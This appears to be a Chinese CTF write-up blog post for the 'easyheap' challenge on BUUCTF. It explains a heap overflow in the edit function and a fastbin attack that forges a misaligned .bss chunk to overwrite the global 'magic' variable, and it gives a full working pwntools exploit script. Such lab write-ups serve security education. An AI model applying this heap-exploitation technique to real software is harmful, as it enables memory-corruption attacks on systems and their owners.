+++
title = "codex"
date = "2026-04-17"
type = "post"
categories = ['BUU']
tags = ['BUU']
draft = false
+++
# easyheap 只改 magic 触发 4869

  

## 题目信息

  

- 程序提供 `create`、`edit`、`delete` 三个堆操作。

- `edit` 存在堆溢出，因为它会直接使用用户输入的 `size` 去 `read`，不检查是否超过原 chunk 大小。

- 主程序里有一个隐藏分支：

  

```c

if (choice == 4869) {

    if ((unsigned long long)magic <= 0x1305) {

        puts("So sad !");

    } else {

        puts("Congrt !");

        l33t();

    }

}

```

  

目标就是把全局变量 `magic` 改成大于 `0x1305` 的值，然后发送 `4869`。

  

## 关键地址

  

```python

magic      = 0x6020c0

heaparray  = 0x6020e0

fake_chunk = 0x6020ad

```

  

这里 `fake_chunk = 0x6020ad` 很关键。

  

原因是这题可以把 fastbin 的 `fd` 指针劫持到 `.bss` 附近，而 `0x6020ad` 这个位置错位后恰好能伪造出一个可用的 fake chunk。随后再次 `malloc`，就能把一块“堆块”分配到 `.bss` 上。

  

## 漏洞点

  

`edit_heap` 的核心逻辑是：

  

```c

printf("Size of Heap : ");

read(0, buf, 8);

size = atoi(buf);

printf("Content of heap : ");

read_input(heaparray[idx], size);

```

  

这里的 `size` 完全由用户控制，所以可以对相邻 chunk 做堆溢出。

  

## 利用思路

  

### 1. 申请三个 fastbin 大小的 chunk

  

申请 3 个 `0x60` 的 chunk：

  

- `chunk0`

- `chunk1`

- `chunk2`

  

它们在堆上是连续的，`0x60` 请求大小对应的实际 chunk size 是 `0x70`，会进入同一个 fastbin。

  

### 2. 释放 chunk2

  

先把 `chunk2` 释放，让它进入 fastbin。

  

### 3. 利用 chunk1 溢出改写 chunk2 的元数据

  

从 `chunk1` 溢出到已经 free 的 `chunk2`：

  

```python

payload = b"B" * 0x60

payload += p64(0)

payload += p64(0x71)

payload += p64(0x6020ad)

```

  

含义：

  

- `b"B" * 0x60` 填满 `chunk1` 的用户数据区

- `p64(0)` 覆盖 `chunk2->prev_size`

- `p64(0x71)` 保持 `chunk2->size` 为 fastbin 大小

- `p64(0x6020ad)` 把 `chunk2->fd` 改成我们伪造的 fake chunk

  

这样 fastbin 链表就变成：

  

```text

chunk2 -> fake_chunk(0x6020ad)

```

  

### 4. 连续 malloc 两次

  

第一次 `malloc(0x60)` 会拿回真正的 `chunk2`。  

第二次 `malloc(0x60)` 会返回伪造出来的 fake chunk。

  

fake chunk 的用户区地址是：

  

```text

0x6020ad + 0x10 = 0x6020bd

```

  

而 `magic` 在：

  

```text

0x6020c0

```

  

两者相差正好 `3` 字节，所以只要写：

  

```python

payload = b"\x00" * 3 + p64(0x1306)

```

  

就能把 `magic` 精确改成 `0x1306`。

  

## exp

  

```python
from pwn import *
context.binary = elf = ELF("./easyheap")
context.arch = "amd64"
context.os = "linux"
context.log_level = "debug"

def start():
    return process(elf.path)
    # return remote("node5.buuoj.cn", 28980)

io = start()
fake_chunk = 0x6020AD
magic = elf.symbols["magic"]

def add(size, content):
    io.sendlineafter(b"Your choice :", b"1")
    io.sendlineafter(b"Size of Heap :", str(size).encode())
    io.sendafter(b"Content of heap:", content)

def edit(index, size, content):
    io.sendlineafter(b"Your choice :", b"2")
    io.sendlineafter(b"Index :", str(index).encode())
    io.sendlineafter(b"Size of Heap :", str(size).encode())
    io.sendafter(b"Content of heap : ", content) 

def delete(index):
    io.sendlineafter(b"Your choice :", b"3")
    io.sendlineafter(b"Index :", str(index).encode())

add(0x60, b"A" * 8)  # 0
add(0x60, b"B" * 8)  # 1
add(0x60, b"C" * 8)  # 2
delete(2)
payload = b"B" * 0x60
payload += p64(0)
payload += p64(0x71)
payload += p64(fake_chunk)
edit(1, len(payload), payload)
add(0x60, b"D" * 8)                  # 2
add(0x60, b"\x00" * 3 + p64(0x1306)) # 3

io.sendlineafter(b"Your choice :", b"4869")

io.interactive()

```

  

## 总结
这题如果本地 `l33t()` 能直接 `cat flag`，最短利用链不是泄漏 libc，也不是改 `__malloc_hook`，而是：
1. 利用 `edit` 做堆溢出
2. 做一次 fastbin attack
3. 把 fake chunk 分配到 `.bss`
4. 覆写 `magic`
5. 输入 `4869`

  

同时，fake_chunk的位置是这么得来的：
`fake_chunk = 0x6020ad` 不是程序里现成的变量名，而是攻击者自己选出来的一个 `.bss` 地址，用来“伪造一个 fastbin chunk”。

核心原因只有一句：

我们想让第二次 `malloc(0x60)` 返回一块落在 `.bss` 上、并且它的用户区正好覆盖 `magic(0x6020c0)` 的内存。

对 `0x60` 请求来说，glibc 实际分配的 chunk size 是 `0x70`，对应 fastbin size 字段一般是 `0x71`。`malloc` 从 fastbin 取块时，会把拿到的 chunk 指针 `p` 转成用户区指针 `p + 0x10` 返回。

所以如果我们想让“返回的用户区”落到 `magic` 附近，就得反推这个 fake chunk 头应该放哪：

```text
magic = 0x6020c0
returned_ptr = fake_chunk + 0x10
```

如果直接想让返回地址等于 `magic`，那就是：

```text
fake_chunk = 0x6020c0 - 0x10 = 0x6020b0
```

但实际 fastbin attack 常常不会选这种完全对齐的位置，而是选一个“错位地址”，让 fake chunk 的 size 字段在内存里的某个字节布局刚好能骗过检查。这里常用的是：

```text
fake_chunk = 0x6020ad
```

这样返回的用户区就是：

```text
0x6020ad + 0x10 = 0x6020bd
```

而：

```text
0x6020c0 - 0x6020bd = 3
```

所以只要往这块“伪造出来的 chunk”里写：

```python
b"\x00"*3 + p64(0x1306)
```

就能把第 4 个字节开始的 8 字节，正好写到 `magic` 上。

也就是说，`0x6020ad` 的来源是：

1. 先锁定目标地址 `magic = 0x6020c0`
2. 知道 `malloc` 返回的是 `chunk + 0x10`
3. 结合 fake chunk 的 size / 对齐检查，选一个能通过检查、又能让用户区覆盖 `magic` 的错位地址
4. 这个地址在这题里就是 `0x6020ad`

简化理解就是：

- `0x6020c0` 是目标
- `0x6020ad` 是为了让 `malloc` “吐”出一块能覆盖这个目标的假 chunk 头地址
